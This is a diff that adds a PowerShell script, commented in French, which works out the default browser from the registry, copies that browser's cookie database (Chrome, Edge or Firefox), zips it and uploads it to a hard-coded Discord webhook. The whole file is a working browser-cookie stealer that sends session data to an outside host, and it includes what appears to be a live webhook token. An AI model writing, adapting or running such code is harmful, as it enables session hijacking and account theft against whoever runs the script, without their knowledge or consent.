@@ -1,0 +1,73 @@
+# === CONFIGURATION ===
+$webhookUrl = "https://discord.com/api/webhooks/1360207891339940001/5-TCcS8UqLVrSVDmP0aL_M69Hk1uDkd-EQuzHvyn9pCCGzljfjTIMC_5qiqIlyAWJ9IQ"  # remplace avec ton vrai webhook
+$tempDir = "$env:TEMP\browser_cookies"
+New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+
+# === DÉTECTER LE NAVIGATEUR PAR DÉFAUT ===
+$defaultBrowserProgId = (Get-ItemProperty "HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice").ProgId
+
+switch ($defaultBrowserProgId) {
+    "ChromeHTML" {
+        $cookiePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+        $browser = "Chrome"
+    }
+    "MSEdgeHTM" {
+        $cookiePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
+        $browser = "Edge"
+    }
+    "FirefoxURL" {
+        $profilesIni = "$env:APPDATA\Mozilla\Firefox\profiles.ini"
+        if (Test-Path $profilesIni) {
+            $lines = Get-Content $profilesIni
+            $defaultProfile = $lines | Where-Object { $_ -match "^Path=" } | Select-Object -First 1
+            $profilePath = $defaultProfile -replace "Path=", ""
+            $cookiePath = "$env:APPDATA\Mozilla\Firefox\$profilePath\cookies.sqlite"
+            $browser = "Firefox"
+        } else {
+            Write-Warning "Impossible de localiser le profil Firefox."
+            return
+        }
+    }
+    default {
+        Write-Warning "Navigateur par défaut non reconnu."
+        return
+    }
+}
+
+# === COPIE ET COMPRESSION DU FICHIER COOKIES ===
+if (Test-Path $cookiePath) {
+    $fileName = "cookies_${browser}_$(Get-Date -Format 'yyyyMMdd_HHmmss').sqlite"
+    $cookieBackup = "$tempDir\$fileName"
+    Copy-Item -Path $cookiePath -Destination $cookieBackup -Force
+
+    # Compression en .zip
+    $zipPath = "$tempDir\$fileName.zip"
+    Compress-Archive -Path $cookieBackup -DestinationPath $zipPath -Force
+} else {
+    Write-Warning "Fichier cookies non trouvé à l'emplacement : $cookiePath"
+    return
+}
+
+# === ENVOI VERS DISCORD VIA WEBHOOK ===
+$boundary = [System.Guid]::NewGuid().ToString()
+$bodyLines = @()
+$bodyLines += "--$boundary"
+$bodyLines += 'Content-Disposition: form-data; name="file"; filename="' + [System.IO.Path]::GetFileName($zipPath) + '"'
+$bodyLines += "Content-Type: application/zip`r`n"
+$bodyLines += [System.IO.File]::ReadAllBytes($zipPath)
+$bodyLines += "--$boundary--"
+
+# Préparation requête
+$bytes = [System.Text.Encoding]::ASCII.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"" + [System.IO.Path]::GetFileName($zipPath) + "`"`r`nContent-Type: application/zip`r`n`r`n")
+$fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
+$endBytes = [System.Text.Encoding]::ASCII.GetBytes("`r`n--$boundary--`r`n")
+
+$fullBody = New-Object System.IO.MemoryStream
+$fullBody.Write($bytes, 0, $bytes.Length)
+$fullBody.Write($fileBytes, 0, $fileBytes.Length)
+$fullBody.Write($endBytes, 0, $endBytes.Length)
+$fullBody.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $fullBody
+
+Write-Host "✅ Fichier cookies envoyé sur Discord avec succès."
